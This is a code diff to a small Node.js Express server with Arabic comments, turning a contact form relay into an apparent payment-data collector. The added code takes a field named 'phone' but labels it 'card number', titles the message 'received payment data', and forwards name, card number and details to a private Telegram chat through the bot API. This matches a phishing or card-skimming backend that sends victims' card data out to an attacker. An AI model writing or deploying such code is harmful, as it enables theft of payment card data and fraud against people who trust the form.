@@ -1,40 +1,44 @@
-const express = require("express");
-const bodyParser = require("body-parser");
-const axios = require("axios");
-require("dotenv").config();
+import express from "express";
+import axios from "axios";
+import dotenv from "dotenv";
+import cors from "cors";
+import bodyParser from "body-parser";
+
+dotenv.config();
 
 const app = express();
 const PORT = process.env.PORT || 3000;
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
+// تمكين CORS للسماح بالطلبات من الواجهة الأمامية
+app.use(cors());
 app.use(bodyParser.json());
-app.use(express.static("public")); // لتقديم index.html
-
-// متغيرات البيئة
-const BOT_TOKEN = process.env.BOT_TOKEN;
-const CHAT_ID = process.env.CHAT_ID;
+app.use(bodyParser.urlencoded({ extended: true }));
 
 app.post("/send", async (req, res) => {
-    const { name, message } = req.body;
-
-    if (!name || !message) {
-        return res.status(400).json({ error: "يرجى إدخال جميع البيانات" });
-    }
-
-    const telegramMessage = `📩 *رسالة جديدة*\n👤 *الاسم:* ${name}\n💬 *الرسالة:* ${message}`;
-
     try {
-        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            chat_id: CHAT_ID,
-            text: telegramMessage,
-            parse_mode: "Markdown",
+        const { name, phone, message } = req.body;
+
+        if (!name || !phone || !message) {
+            return res.status(400).json({ error: "يجب ملء جميع الحقول!" });
+        }
+
+        const text = `🚀 بيانات الدفع المستلمة:\n\n👤 الاسم: ${name}\n📞 رقم البطاقة: ${phone}\n📝 تفاصيل إضافية: ${message}`;
+
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: text,
+            parse_mode: "Markdown"
         });
 
-        res.json({ message: "تم إرسال البيانات بنجاح إلى تيليجرام!" });
+        res.json({ success: true, message: "تم إرسال البيانات بنجاح!" });
     } catch (error) {
-        res.status(500).json({ error: "حدث خطأ أثناء إرسال البيانات" });
+        console.error("خطأ في إرسال البيانات:", error);
+        res.status(500).json({ error: "حدث خطأ أثناء الإرسال." });
     }
 });
 
 app.listen(PORT, () => {
-    console.log(`🚀 السيرفر يعمل على http://localhost:${PORT}`);
+    console.log(`🚀 Server is running on port ${PORT}`);
 });
